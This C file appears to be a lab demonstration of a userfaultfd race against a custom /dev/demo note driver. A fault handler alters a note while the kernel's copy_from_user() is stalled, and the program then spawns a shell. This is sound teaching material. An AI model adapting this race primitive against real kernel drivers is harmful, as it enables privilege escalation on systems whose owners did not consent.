#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
#include <syscall.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <signal.h>
#include <assert.h>
#include <stdint.h>

#include "userfaultfd.h" // modified header file
#include <pthread.h>
#include <signal.h>
#include <poll.h>

#include "demo_note.h"

#define _GNU_SOURCE

#define PAGE_SIZE (1<<0xc)
#define ASM __asm__
#define PAUSE scanf("%*c");

void err_exit(char* msg){
    printf("Error: %s\n", msg);
    exit(-1);
}

int fd;


static void
fault_handler(long arg)
{
    static struct uffd_msg msg;
    static int fault_cnt = 0;
    long uffd = arg;    
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    size_t ret;

    page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
        err_exit("fault_handler mmap");

    for(;;){
        struct pollfd pollfd;
        
        pollfd.fd = uffd;
        pollfd.events = POLLIN;

        ret = poll(&pollfd, 1, -1);
        if ( ret == -1 )
            err_exit("poll");

        ret = read(uffd, &msg, sizeof(msg));
        if (ret<=0) 
            err_exit("userfaultfd msg EOF or read error");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
           err_exit("userfaultfd unexpected event");

        if(msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE)
        {
            puts("Write fault");
        }
        else
        {
            puts("Read fault");

            // change note content before letting copy_from_user() continue
            edit_note(fd, 0, ":D");
        }

        ++fault_cnt;
        uffdio_copy.src = page;
        uffdio_copy.dst = msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
        uffdio_copy.len = PAGE_SIZE;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
           err_exit("UFFDIO_COPY");
    }


}

char *fault_addr;

void register_userfault()
{
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;

    size_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        err_exit("userfaultfd syscall error");

    ua.api = UFFD_API;
    ua.features = 0;

    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        err_exit("UFFDIO_API");

    int len = 2 * PAGE_SIZE;

    fault_addr = mmap( NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (fault_addr == MAP_FAILED)
        err_exit("mmap");

    ur.range.start = fault_addr;
    ur.range.len   = len;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;

    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
        err_exit("ioctl: UFFDIO_REGISTER");

    if( pthread_create(&thr, NULL, fault_handler, uffd) )
        err_exit("pthread_create"); 

}

int main(){

    register_userfault();

    fd = open("/dev/demo", O_RDWR);

    char buf[0x1000];

    add_note(fd, 0x10);
    edit_note(fd, 0, "QQ");

    req.arg1 = fault_addr; // prepare memory which regustered userfaultfd to trigger page fault by copy_from_user() and then execute custom fault handler
    req.arg2.index = 0;
    ioctl( fd , DEMO_USERFAULTFD , &req );

    system("sh");

    return 0;
}